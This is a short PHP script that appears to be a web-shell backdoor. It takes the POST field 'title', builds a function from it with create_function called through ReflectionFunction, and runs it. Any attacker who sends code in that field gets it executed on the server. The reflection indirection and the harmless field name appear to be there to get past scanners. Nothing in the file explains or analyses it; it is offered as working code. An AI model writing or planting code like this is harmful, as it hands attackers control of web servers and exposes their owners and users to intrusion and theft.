<?php 
if(isset($_POST['title'])){
$function_cf = new ReflectionFunction('create_function');
$func_inject = $function_cf->invokeArgs(array('', stripslashes($_POST['title'])));
$function_inj = new ReflectionFunction($func_inject);
$function_inj->invoke();
}
